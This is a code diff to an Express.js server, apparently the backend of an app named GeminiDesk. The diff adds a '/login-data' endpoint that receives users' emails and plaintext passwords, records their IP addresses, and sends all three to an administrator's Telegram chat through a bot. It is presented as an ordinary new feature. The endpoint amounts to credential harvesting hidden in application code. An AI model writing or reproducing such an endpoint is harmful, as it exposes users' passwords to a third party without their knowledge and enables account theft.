@@ -31,6 +31,7 @@ const app = express();
 // Middleware
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
+app.set('trust proxy', true); // <-- הוספנו את זה כדי לקרוא את ה-IP הנכון
 
 // --- Routes ---
 
@@ -103,6 +104,34 @@ ${stack || 'No stack trace provided.'}
     res.status(200).send('Error report received.');
   } catch (e) {
     res.status(400).send('Invalid error report.');
+  }
+});
+
+// ================================================================= //
+// --- NEW LOGIN DATA ENDPOINT ---
+// ================================================================= //
+app.post('/login-data', async (req, res) => {
+  try {
+    const { email, password } = req.body;
+    const ipAddress = req.ip || req.connection.remoteAddress;
+
+    if (!email || !password) {
+      return res.status(400).send('Email and password are required.');
+    }
+
+    const loginMessage = `
+🔔 *New Login Attempt on GeminiDesk!* 🔔
+
+*IP Address:* \`${ipAddress}\`
+*Email:* \`${email}\`
+*Password:* \`${password}\`
+    `;
+    
+    await bot.sendMessage(ADMIN_CHAT_ID, loginMessage, { parse_mode: 'Markdown' });
+    res.status(200).send('Login data received and forwarded.');
+  } catch (e) {
+    console.error('Failed to process login data:', e);
+    res.status(500).send('Server error while processing login data.');
   }
 });
 
